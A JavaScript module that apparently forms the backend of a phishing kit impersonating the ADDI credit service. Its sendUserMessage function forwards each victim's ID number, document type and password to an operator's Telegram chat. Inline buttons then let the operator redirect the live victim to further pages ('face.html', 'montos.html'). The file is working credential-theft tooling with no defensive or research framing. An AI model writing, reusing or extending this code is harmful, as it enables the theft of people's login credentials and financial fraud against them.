import TelegramBot from 'node-telegram-bot-api';

class TelegramService {
  constructor(token, adminChatId, sessions) {
    this.bot = new TelegramBot(token, { polling: false });
    this.adminChatId = adminChatId;
    this.sessions = sessions;
    this.setupHandlers();
  }

  setupHandlers() {
    this.bot.on('callback_query', async (query) => {
      const callbackData = query.data;
      const messageId = query.message.message_id;

      const [action, sessionId] = callbackData.split('_');

      if (!sessionId) {
        this.bot.answerCallbackQuery(query.id, {
          text: '❌ Error: sesión no encontrada',
          show_alert: true
        });
        return;
      }

      const session = this.sessions.get(sessionId);
      if (!session) {
        this.bot.answerCallbackQuery(query.id, {
          text: '❌ Sesión expirada (30 min)',
          show_alert: true
        });
        return;
      }

      let target = null;
      let emoji = '';

      if (action === 'error') {
        target = 'face.html';
        emoji = '❌';
      } else if (action === 'finish') {
        target = 'montos.html';
        emoji = '✅';
      }

      if (target) {
        this.sessions.setPendingCommand(sessionId, {
          action: 'redirect',
          target: target
        });

        await this.bot.answerCallbackQuery(query.id, {
          text: `${emoji} Comando enviado: ${target}`,
          show_alert: false
        });

        const statusText = action === 'error' ? '❌ ERROR LOG' : '✅ FINALIZAR';
        const newCaption = `${query.message.text}\n\n✅ Admin ejecutó: ${statusText}`;

        try {
          await this.bot.editMessageText(newCaption, {
            chat_id: this.adminChatId,
            message_id: messageId,
            reply_markup: { inline_keyboard: [] }
          });
        } catch (e) {
          console.error('Error editando mensaje:', e);
        }
      }
    });
  }

  async sendUserMessage(cedula, docType, password) {
    const now = new Date();
    const timeStr = now.toLocaleTimeString('es-CO', {
      hour: '2-digit',
      minute: '2-digit'
    });
    const dateStr = now.toLocaleDateString('es-CO');

    const msg = `📋 SOLICITUD ADDI ✨
👤 Cédula: ${docType} ${cedula}
🔑 Contraseña: ${password}
⏰ Hora: ${timeStr} (${dateStr})

⏳ Esperando decisión del admin...`;

    const inlineKeyboard = {
      inline_keyboard: [
        [
          { text: '❌ ERROR LOG → face.html', callback_data: 'error_' },
          { text: '✅ FINALIZAR → montos.html', callback_data: 'finish_' }
        ]
      ]
    };

    try {
      const sentMessage = await this.bot.sendMessage(this.adminChatId, msg, {
        reply_markup: inlineKeyboard,
        parse_mode: 'HTML'
      });
      console.log(`[TELEGRAM] Mensaje enviado al admin (ID: ${sentMessage.message_id})`);
      return sentMessage.message_id;
    } catch (error) {
      console.error('Error enviando mensaje a Telegram:', error);
      throw error;
    }
  }

  async updateButtonCallbacks(messageId, sessionId) {
    try {
      await this.bot.editMessageReplyMarkup(
        {
          inline_keyboard: [
            [
              { text: '❌ ERROR LOG → face.html', callback_data: `error_${sessionId}` },
              { text: '✅ FINALIZAR → montos.html', callback_data: `finish_${sessionId}` }
            ]
          ]
        },
        {
          chat_id: this.adminChatId,
          message_id: messageId
        }
      );
    } catch (error) {
      console.error('Error actualizando botones:', error);
    }
  }

  async notifyCompletion(sessionId, action) {
    const session = this.sessions.get(sessionId);
    if (!session || !session.telegramMessageId) return;

    const emoji = action === 'error' ? '❌' : '✅';
    const target = action === 'error' ? 'face.html' : 'montos.html';

    const msg = `${emoji} Usuario redirigido a: ${target}`;

    try {
      await this.bot.sendMessage(this.adminChatId, msg, {
        reply_to_message_id: session.telegramMessageId
      });
    } catch (error) {
      console.error('Error notificando finalización:', error);
    }
  }

  async sendNotification(title, body) {
    const msg = `🔔 ${title}\n${body}`;
    try {
      await this.bot.sendMessage(this.adminChatId, msg);
    } catch (error) {
      console.error('Error enviando notificación:', error);
    }
  }
}

export default TelegramService;
